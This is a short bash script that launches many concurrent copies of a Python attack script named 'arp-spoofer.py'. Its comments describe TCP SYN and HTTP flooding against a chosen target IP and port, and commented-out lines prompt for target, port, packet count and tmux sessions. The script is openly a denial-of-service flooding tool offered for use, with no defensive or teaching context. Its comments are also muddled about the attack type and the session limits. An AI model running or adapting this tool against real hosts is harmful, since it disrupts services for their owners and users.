#!/bin/bash

# This is the Multiplexer to run 100 no. of Terminals
# offering concurrent bash running the same TCP Sync Attack script

# You may try out this Multiplexer on a super-computer :D
script='./arp-spoofer.py';

# Trial & Error tested
# maximum of 100 sessions can be handled by a 16 CPU + 16GB RAM VM
sessions=200;

# Attackers' arguments
#read -p "Enter target IP [192.168.2.65]: " target
#target='192.168.2.240'
#read -p "Enter target Port no. [80/8081/8082]: " port
#port=8082;
#read -p "Enter packets to send [999999999]: " pack
#pack=999999999;

# Trial & Error tested
# maximum of 100 sessions can be handled by a 16 CPU + 16GB RAM VM
#sessions=100;
#read -p "Enter flood sessions [1-999999999]: " sessions;

# Single Terminal Session
#python3 $script $target -a $port -p $pack;

# Asynchronous / Concurrent HTTP requests flooding
# Async Terminal Sessions
# 5 Flooding synchronously
# Flooding with Tmux
for ((i=0; i<$sessions; i++));
do
    python3 $script;
done

# Asynchronous / Concurrent HTTP requests flooding
# Flood 1

# for ((i=0; i<$sessions; i++));
# do
#     tmux new-session -d -s "session${i}" "python3 $script $target -a $port -p $pack";
# done

#echo "Packets: $pack have all been sent to target $target on port $port :D";